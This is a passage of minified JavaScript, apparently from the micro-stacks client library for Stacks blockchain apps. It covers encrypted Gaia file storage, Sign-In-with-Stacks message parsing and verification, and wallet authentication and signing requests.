                r
              )}`
            );
          if (!s)
            throw new Error(
              "[micro-stacks/storage] No private key was passed to getFile, a private key needs to be passed if decrypt is set to true"
            );
          if (!i) return Pn(r, { privateKey: s });
          if (o && i)
            return (async function (e) {
              let t,
                {
                  path: n,
                  storedContents: r,
                  app: i,
                  privateKey: o,
                  username: s,
                  zoneFileLookupURL: a,
                  gaiaHubConfig: l,
                } = e,
                c = o ? Fe(o, !0) : null,
                u = null;
              if (
                (s || l
                  ? (u = await ro({
                      app: i,
                      username: s,
                      zoneFileLookupURL: a,
                      gaiaHubConfig: l,
                    }))
                  : c && (u = Tn(c)),
                !u)
              )
                throw new $i(
                  `Failed to get gaia address for verification of: ${n}`
                );
              try {
                t = JSON.parse(r);
              } catch (F) {
                throw F instanceof SyntaxError
                  ? new Error(
                      "Failed to parse encrypted, signed content JSON. The content may not be encrypted. If using getFile, try passing { verify: false, decrypt: false }."
                    )
                  : F;
              }
              let f = t.signature,
                h = t.publicKey,
                d = t.cipherText,
                p = Tn(h);
              if (!h || !d || !f)
                throw new $i(
                  `Failed to get signature verification data from file: ${n}`
                );
              if (p !== u)
                throw new $i(
                  `Signer pubkey address (${p}) doesn't match gaia address (${u})`
                );
              if (!On({ signature: f, contents: d, publicKey: h }))
                throw new $i(
                  `Contents do not match ECDSA signature in file: ${n}`
                );
              if (!o)
                throw Error(
                  "Private key needs to be passed in order to decrypt content"
                );
              return Pn(d, { privateKey: o });
            })({
              path: e,
              storedContents: r,
              app: n.app,
              privateKey: s,
              username: n.username,
              zoneFileLookupURL: n.zoneFileLookupURL,
              gaiaHubConfig: n.gaiaHubConfig,
            });
          throw new Error("[micro-stacks/storage] Should be unreachable.");
        }
        ((e, t, n) => {
          ((e, t, n) => {
            t in e
              ? Bi(e, t, {
                  enumerable: !0,
                  configurable: !0,
                  writable: !0,
                  value: n,
                })
              : (e[t] = n);
          })(e, "symbol" != typeof t ? t + "" : t, n);
        })(
          Xi,
          "supportedTypesMsg",
          "Supported types are: `string` (to be UTF8 encoded), `Uint8Array`, `Blob`, `File`, `ArrayBuffer`, `UInt8Array` or any other typed array buffer. "
        );
        n(2682);
        var so = "micro-stacks",
          ao = {
            getItem: (e) => null,
            setItem: (e, t) => {},
            removeItem: (e) => {},
          },
          lo = (function (e) {
            let { storage: t, key: n = so, serialize: r, deserialize: i } = e;
            return {
              ...t,
              getItem: function (e) {
                let r =
                    arguments.length > 1 && void 0 !== arguments[1]
                      ? arguments[1]
                      : null,
                  o = `${n}.${e.replace(`${n}.`, "")}`,
                  s = t.getItem(o);
                if (!i) return null !== s && void 0 !== s ? s : r;
                try {
                  return s ? i(s) : r;
                } catch (y) {
                  return console.warn(y), r;
                }
              },
              setItem: (e, i) => {
                let o = `${n}.${e.replace(`${n}.`, "")}`;
                if (null === i) t.removeItem(o);
                else
                  try {
                    let e = r ? r(i) : i;
                    t.setItem(o, e);
                  } catch (Gt) {
                    console.error(Gt);
                  }
              },
              removeItem: (e) => t.removeItem(`${n}.${e}`),
            };
          })({
            storage: typeof window < "u" ? window.localStorage : ao,
            serialize: JSON.stringify,
            deserialize: JSON.parse,
          });
        function co(e) {
          return `[@micro-stacks/client] ${e}`;
        }
        function uo(e, t) {
          !(function (e, t) {
            if (!e) {
              if (yi) throw new Error(wi);
              var n = "function" === typeof t ? t() : t,
                r = n ? "".concat(wi, ": ").concat(n) : wi;
              throw new Error(r);
            }
          })(e, co(t));
        }
        var fo = ((e) => (
            (e.ContractCall = "contract_call"),
            (e.TokenTransfer = "token_transfer"),
            (e.ContractDeploy = "contract_deploy"),
            e
          ))(fo || {}),
          ho = ((e) => (
            (e.Authentication = "status/Authentication"),
            (e.TransactionSigning = "status/TransactionSigning"),
            (e.MessageSigning = "status/MessageSigning"),
            (e.StructuredMessageSigning = "status/StructuredMessageSigning"),
            (e.PsbtSigning = "status/PsbtSigning"),
            e
          ))(ho || {}),
          po = ((e) => (
            (e.IsLoading = "status/IsLoading"), (e.IsIdle = "status/IsIdle"), e
          ))(po || {}),
          go = "store",
          yo = typeof document > "u";
        function wo(e) {
          if (
            e &&
            !/[^a-z0-9\:\/\?\#\[\]\@\!\$\&\'\(\)\*\+\,\;\=\.\-\_\~\%]/i.test(
              e
            ) &&
            !/%[^0-9a-f]/i.test(e) &&
            !/%[0-9a-f](:?[^0-9a-f]|$)/i.test(e)
          ) {
            var t,
              n,
              r,
              i,
              o,
              s = "",
              a = "";
            if (
              ((t = (function (e) {
                return e.match(
                  /(?:([^:\/?#]+):)?(?:\/\/([^\/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?/
                );
              })(e)),
              (s = t[1]),
              (n = t[2]),
              (r = t[3]),
              (i = t[4]),
              (o = t[5]),
              s && s.length && r.length >= 0)
            ) {
              if (n && n.length) {
                if (0 !== r.length && !/^\//.test(r)) return;
              } else if (/^\/\//.test(r)) return;
              if (/^[a-z][a-z0-9\+\-\.]*$/.test(s.toLowerCase()))
                return (
                  (a += s + ":"),
                  n && n.length && (a += "//" + n),
                  (a += r),
                  i && i.length && (a += "?" + i),
                  o && o.length && (a += "#" + o),
                  a
                );
            }
          }
        }
        var mo = "(([^:?#]+):)?(([^?#]*))?([^?#]*)(\\?([^#]*))?(#(.*))?",
          bo =
            "([0-9]+)-(0[1-9]|1[012])-(0[1-9]|[12][0-9]|3[01])[Tt]([01][0-9]|2[0-3]):([0-5][0-9]):([0-5][0-9]|60)(.[0-9]+)?(([Zz])|([+|-]([01][0-9]|2[0-3]):[0-5][0-9]))",
          vo = `^(?<domain>([^?#]*)) wants you to sign in with your Stacks account:\\n(?<address>S[A-Z0-9]{40})\\n\\n((?<statement>[^\\n]+)\\n)?${`\\nURI: (?<uri>${mo}?)`}\\nVersion: (?<version>1)\\nChain ID: (?<chainId>[0-9]+)\\nNonce: (?<nonce>[a-zA-Z0-9]{8,})${`\\nIssued At: (?<issuedAt>${bo})`}${`(\\nExpiration Time: (?<expirationTime>${bo}))?`}${`(\\nNot Before: (?<notBefore>${bo}))?`}(\\nRequest ID: (?<requestId>[-._~!$&'()*+,;=:@%a-zA-Z0-9]*))?${`(\\nResources:(?<resources>(\\n- ${mo}?)+))?`}$`,
          Eo = ["signature", "domain", "nonce", "time"],
          So = class {
            constructor(e, t, n) {
              a(this, "type", void 0),
                a(this, "expected", void 0),
                a(this, "received", void 0),
                (this.type = e),
                (this.expected = t),
                (this.received = n);
            }
          };
        function xo(e) {
          let { state: t, version: n } = e;
          var r, i, o;
          return JSON.stringify([
            [
              null == (r = t.network) ? void 0 : r.chainId,
              null == (o = null == (i = t.network) ? void 0 : i.getCoreApiUrl)
                ? void 0
                : o.call(i),
            ],
            [
              t.currentAccountIndex,
              t.accounts.map((e) => ({
                appPrivateKey: e.appPrivateKey,
                address: bn(e.address[0], p(e.address[1])),
                profile_url: e.profile_url,
              })),
            ],
            n,
          ]);
        }
        var Ao = (e) => {
            if (e) {
              if ("string" != typeof e) return e;
              if ("testnet" === e) return new fi();
            }
            return new ui();
          },
          ko = (e) => {
            let { network: t = new ui(), ...n } = e;
            return {
              statuses: {
                "status/Authentication": "status/IsIdle",
                "status/TransactionSigning": "status/IsIdle",
                "status/MessageSigning": "status/IsIdle",
                "status/StructuredMessageSigning": "status/IsIdle",
              },
              network: Ao(t),
              appName: n.appName,
              appIconUrl: n.appIconUrl,
              accounts: [],
              currentAccountIndex: 0,
              onPersistState: n.onPersistState,
              onAuthentication: n.onAuthentication,
              onNoWalletFound: n.onNoWalletFound,
              onSignOut: n.onSignOut,
            };
          },
          To = (e, t) => {
            try {
              let { version: n, ...r } = (function (e) {
                var t;
                let n = JSON.parse(e),
                  [r, i] = n[0],
                  [o, s] = n[1],
                  a = null !== (t = n[2]) && void 0 !== t ? t : 1;
                return {
                  network:
                    r === Z.Mainnet ? new ui({ url: i }) : new fi({ url: i }),
                  currentAccountIndex: o,
                  accounts: s.map((e) => {
                    let [t, n] = En(e.address);
                    return {
                      appPrivateKey: e.appPrivateKey,
                      address: [t, g(n)],
                      profile_url: e.profile_url,
                    };
                  }),
                  version: a,
                };
              })(e);
              return { state: { ...ko(t), ...r }, version: n };
            } catch {
              return { state: ko(t), version: 1 };
            }
          };
        var Co = class {
          constructor() {
            var e, t;
            let n =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : {};
            a(this, "config", void 0),
              a(this, "storage", void 0),
              a(this, "store", void 0),
              a(this, "debug", void 0),
              a(this, "fetcher", void 0),
              a(this, "getState", () => this.store.getState()),
              a(this, "onStorageUpdate", (e) => {
                if (typeof document < "u") {
                  let t = window.location.host === new URL(e.url).host,
                    n = "micro-stacks.store" === e.key;
                  if (t && n) {
                    let t = e.newValue;
                    this.hydrate(JSON.parse(t));
                  }
                }
              }),
              a(this, "tabSyncSubscription", (e) => {
                let t = typeof document < "u";
                return (
                  t &&
                    e &&
                    window.addEventListener("storage", this.onStorageUpdate),
                  () => {
                    t &&
                      e &&
                      window.removeEventListener(
                        "storage",
                        this.onStorageUpdate
                      );
                  }
                );
              }),
              a(this, "onPersistState", (e) => {
                var t, n;
                return null ==
                  (n =
                    null == (t = this.store.getState())
                      ? void 0
                      : t.onPersistState)
                  ? void 0
                  : n.call(t, e);
              }),
              a(this, "setOnPersistState", (e) => {
                this.setState((t) => ({ ...t, onPersistState: e })),
                  (this.config.onPersistState = e);
              }),
              a(this, "setOnNoWalletFound", (e) => {
                this.setState((t) => ({ ...t, onNoWalletFound: e })),
                  (this.config.onPersistState = e);
              }),
              a(this, "setOnSignOut", (e) => {
                this.setState((t) => ({ ...t, onSignOut: e })),
                  (this.config.onSignOut = e);
              }),
              a(this, "setOnAuthentication", (e) => {
                this.setState((t) => ({ ...t, onAuthentication: e })),
                  (this.config.onAuthentication = e);
              }),
              a(this, "persist", async () => {
                if (this.onPersistState) {
                  let e = this.dehydrate(this.store.getState());
                  await this.onPersistState(e);
                }
              }),
              a(this, "selectHasSession", (e) => Boolean(e.accounts.length)),
              a(this, "selectAccounts", (e) => e.accounts),
              a(this, "selectAccount", (e) =>
                this.selectHasSession(e)
                  ? e.accounts[e.currentAccountIndex]
                  : void 0
              ),
              a(this, "selectNetwork", (e) =>
                this.config.enableNetworkSwitching
                  ? e.network
                  : Ao(this.config.network)
              ),
              a(this, "selectNetworkChain", (e) =>
                this.selectNetwork(e).chainId === Z.Mainnet
                  ? "mainnet"
                  : "testnet"
              ),
              a(this, "selectTestnetStxAddress", (e) => {
                let t = this.selectAccount(e);
                return t
                  ? bn(
                      t.address[0] === pn.mainnetP2SH
                        ? pn.testnetP2SH
                        : pn.testnetP2PKH,
                      p(t.address[1])
                    )
                  : void 0;
              }),
              a(this, "selectMainnetStxAddress", (e) => {
                let t = this.selectAccount(e);
                return t ? bn(t.address[0], p(t.address[1])) : void 0;
              }),
              a(this, "selectStxAddress", (e) =>
                "mainnet" === this.selectNetworkChain(e)
                  ? this.selectMainnetStxAddress(e)
                  : this.selectTestnetStxAddress(e)
              ),
              a(this, "selectAppDetails", (e) =>
                e.appName && e.appIconUrl
                  ? { name: e.appName, icon: e.appIconUrl }
                  : void 0
              ),
              a(this, "selectIdentityAddress", (e) => {
                let t = this.selectAccount(e);
                return null != t && t.appPrivateKey
                  ? kn(t.appPrivateKey)
                  : void 0;
              }),
              a(this, "selectDecentralizedID", (e) => {
                let t = this.selectIdentityAddress(e);
                return t ? `did:btc-addr:${t}` : void 0;
              }),
              a(this, "selectStatuses", (e) => e.statuses),
              a(this, "statuses", () => this.selectStatuses(this.getState())),
              a(
                this,
                "isSignMessageRequestPending",
                () => this.statuses()["status/MessageSigning"]
              ),
              a(
                this,
                "isSignStructuredMessageRequestPending",
                () => this.statuses()["status/StructuredMessageSigning"]
              ),
              a(this, "authenticate", async (e) => {
                if (!this.handleNoStacksProviderFound()) return;
                let t = this.selectAppDetails(this.getState());
                uo(
                  t,
                  "App details are not defined for you app. Most functionality (authentication, signing requests) require details be passed to the wallet. Add them to your MicroStacksClient config."
                );
                let n = this.selectAccounts(this.getState());
                this.setIsRequestPending("status/Authentication"),
                  await zr(
                    {
                      appDetails: t,
                      onFinish: async (t) => {
                        let { profile: r, ...i } = t;
                        var o, s;
                        let [a, l] = En(i.addresses.mainnet),
                          c = [a, g(l)];
                        n.find((e) => e.address === c)
                          ? this.setState((e) => ({
                              ...e,
                              currentAccountIndex: n.findIndex(
                                (e) => e.address === c
                              ),
                            }))
                          : this.setState((e) => {
                              var t;
                              return {
                                ...e,
                                accounts: e.accounts.concat({
                                  address: c,
                                  appPrivateKey:
                                    null != (t = this.debug) &&
                                    t.disableAppPrivateKey
                                      ? void 0
                                      : i.appPrivateKey,
                                  decentralizedID: i.decentralizedID,
                                  profile_url: i.profile_url,
                                }),
                                currentAccountIndex: e.accounts.length,
                              };
                            }),
                          null == (o = null == e ? void 0 : e.onFinish) ||
                            o.call(e, i),
                          null == (s = this.onAuthentication) ||
                            s.call(this, { profile: r, ...i }),
                          await this.persist(),
                          this.setIsIdle("status/Authentication");
                      },
                      onCancel: (t) => {
                        var n;
                        this.setIsIdle("status/Authentication"),
                          null == (n = null == e ? void 0 : e.onCancel) ||
                            n.call(e, t);
                      },
                    },
                    ao
                  );
              }),
              a(this, "signOut", async (e) => {
                var t, n, r, i;
                return (
                  null ==
                    (r =
                      null ==
                      (n = null == (t = this.store) ? void 0 : t.persist)
                        ? void 0
                        : n.clearStorage) || r.call(n),
                  null == (i = this.onSignOut) || i.call(this),
                  this.resetState(),
                  null == e ? void 0 : e()
                );
              }),
              a(this, "getSignInMessage", (e) => {
                let {
                  domain: t,
                  nonce: n,
                  version: r = "1",
                  statement: i = "Sign in with Stacks",
                } = e;
                if (!this.handleNoStacksProviderFound()) return;
                let o = this.getState(),
                  s = this.selectAppDetails(o),
                  l = this.selectStxAddress(o);
                uo(
                  s,
                  "App details are not defined for you app. Most functionality (authentication, signing requests) require details be passed to the wallet. Add them to your MicroStacksClient config."
                ),
                  uo(
                    l,
                    "No current Stacks address can be found. This could be because a session has been invalidated, or the user is not signed in."
                  );
                let u = c("document", { throwIfUnavailable: !1 })
                  ? window.location.origin
                  : "";
                return new (class {
                  constructor(e) {
                    a(this, "domain", void 0),
                      a(this, "address", void 0),
                      a(this, "statement", void 0),
                      a(this, "uri", void 0),
                      a(this, "version", void 0),
                      a(this, "chainId", void 0),
                      a(this, "nonce", void 0),
                      a(this, "issuedAt", void 0),
                      a(this, "expirationTime", void 0),
                      a(this, "notBefore", void 0),
                      a(this, "requestId", void 0),
                      a(this, "resources", void 0),
                      "string" == typeof e &&
                        (e = new (class {
                          constructor(e) {
                            var t, n, r, i, o, s, l, c, u, f, h, d, p, g;
                            a(this, "domain", void 0),
                              a(this, "address", void 0),
                              a(this, "statement", void 0),
                              a(this, "uri", void 0),
                              a(this, "version", void 0),
                              a(this, "chainId", void 0),
                              a(this, "nonce", void 0),
                              a(this, "issuedAt", void 0),
                              a(this, "expirationTime", void 0),
                              a(this, "notBefore", void 0),
                              a(this, "requestId", void 0),
                              a(this, "resources", void 0),
                              a(this, "match", void 0);
                            let y = new RegExp(vo, "g").exec(e);
                            if (!y)
                              throw new Error(
                                "Message did not match the regular expression."
                              );
                            if (
                              ((this.match = y),
                              (this.domain =
                                null == (t = null == y ? void 0 : y.groups)
                                  ? void 0
                                  : t.domain),
                              0 === this.domain.length ||
                                !/[^#?]*/.test(this.domain))
                            )
                              throw new Error("Domain cannot be empty.");
                            if (
                              ((this.address =
                                null == (n = null == y ? void 0 : y.groups)
                                  ? void 0
                                  : n.address),
                              !xn(this.address))
                            )
                              throw new Error("Invalid address.");
                            if (
                              ((this.statement =
                                null == (r = null == y ? void 0 : y.groups)
                                  ? void 0
                                  : r.statement),
                              (this.uri =
                                null == (i = null == y ? void 0 : y.groups)
                                  ? void 0
                                  : i.uri),
                              !wo(this.uri))
                            )
                              throw new Error("Invalid URI.");
                            (this.version =
                              null == (o = null == y ? void 0 : y.groups)
                                ? void 0
                                : o.version),
                              (this.nonce =
                                null == (s = null == y ? void 0 : y.groups)
                                  ? void 0
                                  : s.nonce),
                              (this.chainId = parseInt(
                                null == (l = null == y ? void 0 : y.groups)
                                  ? void 0
                                  : l.chainId
                              )),
                              (this.issuedAt =
                                null == (c = null == y ? void 0 : y.groups)
                                  ? void 0
                                  : c.issuedAt),
                              (this.expirationTime =
                                null == (u = null == y ? void 0 : y.groups)
                                  ? void 0
                                  : u.expirationTime),
                              (this.notBefore =
                                null == (f = null == y ? void 0 : y.groups)
                                  ? void 0
                                  : f.notBefore),
                              (this.requestId =
                                null == (h = null == y ? void 0 : y.groups)
                                  ? void 0
                                  : h.requestId),
                              (this.resources =
                                null ==
                                (p =
                                  null == (d = null == y ? void 0 : y.groups)
                                    ? void 0
                                    : d.resources)
                                  ? void 0
                                  : p.split("\n- ").slice(1)),
                              (null == (g = this.resources)
                                ? void 0
                                : g.length) > 0 &&
                                this.resources.forEach((e) => {
                                  if (!wo(e))
                                    throw new Error(
                                      `${e} is not a valid resource.`
                                    );
                                });
                          }
                        })(e)),
                      (this.domain = e.domain),
                      (this.address = e.address),
                      (this.statement = e.statement),
                      (this.uri = e.uri),
                      (this.version = e.version),
                      (this.nonce = e.nonce),
                      (this.issuedAt = e.issuedAt),
                      (this.expirationTime = e.expirationTime),
                      (this.notBefore = e.notBefore),
                      (this.requestId = e.requestId),
                      (this.chainId = e.chainId),
                      (this.resources = e.resources),
                      "string" == typeof this.chainId &&
                        (this.chainId = parseInt(this.chainId)),
                      this.validateMessage();
                  }
                  toMessage() {
                    this.validateMessage();
                    let e = `${this.domain} wants you to sign in with your Stacks account:`,
                      t = `URI: ${this.uri}`,
                      n = [e, this.address].join("\n"),
                      r = [
                        t,
                        `Version: ${this.version}`,
                        "Chain ID: " + this.chainId || 0,
                        `Nonce: ${this.nonce}`,
                      ];
                    if (
                      (this.issuedAt && Date.parse(this.issuedAt),
                      (this.issuedAt = this.issuedAt
                        ? this.issuedAt
                        : new Date().toISOString()),
                      r.push(`Issued At: ${this.issuedAt}`),
                      this.expirationTime)
                    ) {
                      let e = `Expiration Time: ${this.expirationTime}`;
                      r.push(e);
                    }
                    this.notBefore && r.push(`Not Before: ${this.notBefore}`),
                      this.requestId && r.push(`Request ID: ${this.requestId}`),
                      this.resources &&
                        r.push(
                          [
                            "Resources:",
                            ...this.resources.map((e) => `- ${e}`),
                          ].join("\n")
                        );
                    let i = r.join("\n");
                    return (
                      (n = [n, this.statement].join("\n\n")),
                      this.statement && (n += "\n"),
                      [n, i].join("\n")
                    );
                  }
                  prepareMessage() {
                    let e;
                    return this.version, (e = this.toMessage()), e;
                  }
                  async verify(e) {
                    return new Promise(async (t, n) => {
                      Object.keys(e).forEach((e) => {
                        Eo.includes(e) ||
                          n({
                            success: !1,
                            data: this,
                            error: new Error(
                              `${e} is not a valid key for VerifyParams.`
                            ),
                          });
                      });
                      let r = (e) => {
                          n(e);
                        },
                        { signature: i, domain: o, nonce: s, time: a } = e;
                      o &&
                        o !== this.domain &&
                        r({
                          success: !1,
                          data: this,
                          error: new So(
                            "Domain do not match provided domain for verification.",
                            o,
                            this.domain
                          ),
                        }),
                        s &&
                          s !== this.nonce &&
                          r({
                            success: !1,
                            data: this,
                            error: new So(
                              "Nonce do not match provided nonce for verification.",
                              s,
                              this.nonce
                            ),
                          });
                      let l,
                        c,
                        u = new Date(a || new Date());
                      if (this.expirationTime) {
                        let e = new Date(this.expirationTime);
                        u.getTime() >= e.getTime() &&
                          r({
                            success: !1,
                            data: this,
                            error: new So(
                              "Expired message.",
                              `${u.toISOString()} < ${e.toISOString()}`,
                              `${u.toISOString()} >= ${e.toISOString()}`
                            ),
                          });
                      }
                      if (this.notBefore) {
                        let e = new Date(this.notBefore);
                        u.getTime() < e.getTime() &&
                          r({
                            success: !1,
                            data: this,
                            error: new So(
                              "Message is not valid yet.",
                              `${u.toISOString()} >= ${e.toISOString()}`,
                              `${u.toISOString()} < ${e.toISOString()}`
                            ),
                          });
                      }
                      try {
                        l = this.prepareMessage();
                      } catch (Qt) {
                        return void r({ success: !1, data: this, error: Qt });
                      }
                      try {
                        let e = oi(l),
                          t = ai({ signature: i }),
                          n = si({
                            hash: e,
                            signature: t.signature,
                            recoveryBytes: t.recoveryBytes,
                          });
                        ((e) => li(e) || li({ ...e, prefix: ii }))({
                          signature: i,
                          message: e,
                        }) && (c = An(n, En(this.address)[0]));
                      } catch {
                      } finally {
                        c !== this.address &&
                          r({
                            success: !1,
                            data: this,
                            error: new So(
                              "Signature do not match address of the message.",
                              c,
                              `Resolved address to be ${this.address}`
                            ),
                          });
                      }
                      t({ success: !0, data: this });
                    });
                  }
                  validateMessage() {
                    var e;
                    if (arguments.length > 0)
                      throw new So(
                        "Unable to parse the message.",
                        "Unexpected argument in the validateMessage function."
                      );
                    if (
                      !this.domain ||
                      0 === this.domain.length ||
                      !/[^#?]*/.test(this.domain)
                    )
                      throw new So(
                        "Invalid domain.",
                        `${this.domain} to be a valid domain.`
                      );
                    if (!xn(this.address))
                      throw new So(
                        "Invalid address.",
                        `${this.address} to be a valid address.`
                      );
                    if (!wo(this.uri))
                      throw new So(
                        "URI does not conform to RFC 3986.",
                        `${this.uri} to be a valid uri.`
                      );
                    if ("1" !== this.version)
                      throw new So(
                        "Invalid message version.",
                        "1",
                        this.version
                      );
                    let t =
                      null == (e = null == this ? void 0 : this.nonce)
                        ? void 0
                        : e.match(/[a-zA-Z0-9]{8,}/);
                    if (!t || this.nonce.length < 8 || t[0] !== this.nonce)
                      throw new So(
                        "Nonce size smaller then 8 characters or is not alphanumeric.",
                        `Length > 8 (${
                          null == t ? void 0 : t.length
                        }). Alphanumeric.`,
                        this.nonce
                      );
                    let n =
                      /([0-9]+)-(0[1-9]|1[012])-(0[1-9]|[12][0-9]|3[01])[Tt]([01][0-9]|2[0-3]):([0-5][0-9]):([0-5][0-9]|60)(\.[0-9]+)?(([Zz])|([+|\-]([01][0-9]|2[0-3]):[0-5][0-9]))/;
                    if (this.issuedAt && !n.test(this.issuedAt))
                      throw new Error("Invalid time format.");
                    if (this.expirationTime && !n.test(this.expirationTime))
                      throw new Error("Invalid time format.");
                    if (this.notBefore && !n.test(this.notBefore))
                      throw new Error("Invalid time format.");
                  }
                })({
                  domain: s.name,
                  address: l,
                  statement: i,
                  uri: null !== t && void 0 !== t ? t : u,
                  version: r,
                  chainId: Z.Mainnet,
                  nonce: n,
                });
              }),
              a(this, "signTransaction", async (e, t) => {
                if (!this.handleNoStacksProviderFound()) return;
                let n = this.getState(),
                  r = this.selectAppDetails(n),
                  i = this.selectStxAddress(n),
                  o = this.selectAccount(n),
                  s = this.selectNetwork(n);
                uo(
                  r,
                  "App details are not defined for you app. Most functionality (authentication, signing requests) require details be passed to the wallet. Add them to your MicroStacksClient config."
                ),
                  uo(
                    i,
                    "No current Stacks address can be found. This could be because a session has been invalidated, or the user is not signed in."
                  ),
                  uo(
                    o,
                    "There is not current user session available. Please make sure the user has signed in before attempting this action."
                  ),
                  this.setIsRequestPending("status/TransactionSigning");
                let a,
                  l = {
                    privateKey: o.appPrivateKey,
                    appDetails: r,
                    stxAddress: i,
                    network: s,
                    postConditionMode: t.postConditionMode,
                    postConditions: t.postConditions,
                    attachment: t.attachment,
                    sponsored: t.sponsored,
                  },
                  c = await ("token_transfer" === e
                    ? Mr
                    : "contract_call" === e
                    ? Hr
                    : Dr)({ ...l, ...t });
                return (
                  uo(c, "Transaction JWT could not be created"),
                  await Wr({
                    token: c,
                    onFinish: (e) => {
                      var n;
                      (a = e),
                        null == (n = null == t ? void 0 : t.onFinish) ||
                          n.call(t, e),
                        this.setIsIdle("status/TransactionSigning");
                    },
                    onCancel: (e) => {
                      var n;
                      null == (n = null == t ? void 0 : t.onCancel) ||
                        n.call(t, e),
                        this.setIsIdle("status/TransactionSigning");
                    },
                  }),
                  a
                );
              }),
              a(this, "signPSBT", async (e) => {
                if (!this.handleNoStacksProviderFound()) return;
                let t,
                  n = this.getState(),
                  r = this.selectAppDetails(n),
                  i = this.selectStxAddress(n),
                  o = this.selectAccount(n),
                  s = this.selectNetwork(n);
                return (
                  uo(
                    r,
                    "App details are not defined for you app. Most functionality (authentication, signing requests) require details be passed to the wallet. Add them to your MicroStacksClient config."
                  ),
                  uo(
                    i,
                    "No current Stacks address can be found. This could be because a session has been invalidated, or the user is not signed in."
                  ),
                  uo(
                    o,
                    "There is not current user session available. Please make sure the user has signed in before attempting this action."
                  ),
                  uo(
                    e.hex,
                    "No hex found -- a hex string is required when requesting a PSBT signature."
                  ),
                  this.setIsRequestPending("status/PsbtSigning"),
                  await ci({
                    appDetails: r,
                    privateKey: o.appPrivateKey,
                    stxAddress: i,
                    network: s,
                    allowedSighash: e.allowedSighash,
                    hex: e.hex,
                    signAtIndex: e.signAtIndex,
                    onFinish: (n) => {
                      var r;
                      (t = n),
                        null == (r = null == e ? void 0 : e.onFinish) ||
                          r.call(e, n),
                        this.setIsIdle("status/PsbtSigning");
                    },
                    onCancel: () => {
                      var t;
                      null == (t = null == e ? void 0 : e.onCancel) ||
                        t.call(e),
                        this.setIsIdle("status/PsbtSigning");
                    },
                  }),
                  t
                );
              }),
              a(this, "signMessage", async (e) => {
                if (!this.handleNoStacksProviderFound()) return;
                let t,
                  n = this.getState(),
                  r = this.selectAppDetails(n),
                  i = this.selectStxAddress(n),
                  o = this.selectAccount(n),
                  s = this.selectNetwork(n);
                return (
                  uo(
                    r,
                    "App details are not defined for you app. Most functionality (authentication, signing requests) require details be passed to the wallet. Add them to your MicroStacksClient config."
                  ),
                  uo(
                    i,
                    "No current Stacks address can be found. This could be because a session has been invalidated, or the user is not signed in."
                  ),
                  uo(
                    o,
                    "There is not current user session available. Please make sure the user has signed in before attempting this action."
                  ),
                  uo(
                    e.message,
                    "No message found -- a message is required when requesting a message signature."
                  ),
                  this.setIsRequestPending("status/MessageSigning"),
                  await Zr({
                    appDetails: r,
                    privateKey: o.appPrivateKey,
                    stxAddress: i,
                    network: s,
                    message: e.message,
                    onFinish: (n) => {
                      var r;
                      (t = n),
                        null == (r = null == e ? void 0 : e.onFinish) ||
                          r.call(e, n),
                        this.setIsIdle("status/MessageSigning");
                    },
                    onCancel: (t) => {
                      var n;
                      null == (n = null == e ? void 0 : e.onCancel) ||
                        n.call(e, t),
                        this.setIsIdle("status/MessageSigning");
                    },
                  }),
                  t
                );
              }),
              a(this, "signStructuredMessage", async (e) => {
                var t, n, r, i, o, s;
                if (!this.handleNoStacksProviderFound()) return;
                let a,
                  l = this.getState(),
                  c = this.selectAppDetails(l),
                  u = this.selectStxAddress(l),
                  f = this.selectAccount(l),
                  h = this.selectNetwork(l);
                return (
                  uo(
                    c,
                    "App details are not defined for you app. Most functionality (authentication, signing requests) require details be passed to the wallet. Add them to your MicroStacksClient config."
                  ),
                  uo(
                    u,
                    "No current Stacks address can be found. This could be because a session has been invalidated, or the user is not signed in."
                  ),
                  uo(
                    f,
                    "There is not current user session available. Please make sure the user has signed in before attempting this action."
                  ),
                  uo(
                    e.message,
                    "No message found -- a message is required when requesting a message signature."
                  ),
                  this.setIsRequestPending("status/StructuredMessageSigning"),
                  await Xr({
                    appDetails: c,
                    privateKey: f.appPrivateKey,
                    stxAddress: u,
                    network: h,
                    domain: {
                      name:
                        null !==
                          (t = null == (i = e.domain) ? void 0 : i.name) &&
                        void 0 !== t
                          ? t
                          : c.name,
                      version:
                        null !==
                          (n = null == (o = e.domain) ? void 0 : o.version) &&
                        void 0 !== n
                          ? n
                          : "1.0.0",
                      chainId:
                        null !==
                          (r = null == (s = e.domain) ? void 0 : s.chainId) &&
                        void 0 !== r
                          ? r
                          : h.chainId,
                    },
                    message: e.message,
                    onFinish: (t) => {
                      var n;
                      (a = t),
                        null == (n = null == e ? void 0 : e.onFinish) ||
                          n.call(e, t),
                        this.setIsIdle("status/StructuredMessageSigning");
                    },
                    onCancel: (t) => {
                      var n;
                      null == (n = null == e ? void 0 : e.onCancel) ||
                        n.call(e, t),
                        this.setIsIdle("status/StructuredMessageSigning");
                    },
                  }),
                  a
                );
              }),
              a(this, "setNetwork", (e) => {
                if (!this.config.enableNetworkSwitching)
                  throw new Error(
                    co(
                      "Network switching is currently disabled. Set `enableNetworkSwitching` to `true` to enable."
                    )
                  );
                "string" == typeof e
                  ? this.setState((t) => ({
                      ...t,
                      network: "mainnet" === e ? new ui() : new fi(),
                    }))
                  : this.setState((t) => ({ ...t, network: e })),
                  this.persist();
              }),
              a(this, "putFile", (e, t, n) => {
                let { encrypt: r = !0, sign: i } = n,
                  o = this.selectHasSession(this.getState()),
                  s = this.selectGaiaHubConfig(this.getState()),
                  a = this.selectAccount(this.getState());
                if (o) {
                  if (null != a && a.appPrivateKey && s)
                    return (async function (e, t, n) {
                      let r,
                        { privateKey: i } = n,
                        {
                          encrypt: o,
                          sign: s,
                          gaiaHubConfig: a,
                          cipherTextEncoding: l,
                        } = n,
                        { contentType: c = "" } = n,
                        u = Vi(a.max_file_upload_size_megabytes),
                        f = u > 0,
                        h = new Xi(t, c);
                      if (
                        ((c = h.contentType),
                        !o && f && h.contentByteLength > u)
                      ) {
                        let e = `The max file upload size for this hub is ${u} bytes, the given content is ${h.contentByteLength} bytes`,
                          t = new Ki(e, null, u);
                        throw (console.error(t), t);
                      }
                      if (o && f && l) {
                        let e = sn({
                          contentLength: h.contentByteLength,
                          wasString: h.wasString,
                          sign: !!s,
                          cipherTextEncoding: l,
                        });
                        if (e > u) {
                          let t = new Ki(
                            `The max file upload size for this hub is ${u} bytes, the given content is ${e} bytes after encryption`,
                            null,
                            u
                          );
                          throw (console.error(t), t);
                        }
                      }
                      if (!o && s) {
                        let t = await h.load();
                        if ("string" == typeof s) i = s;
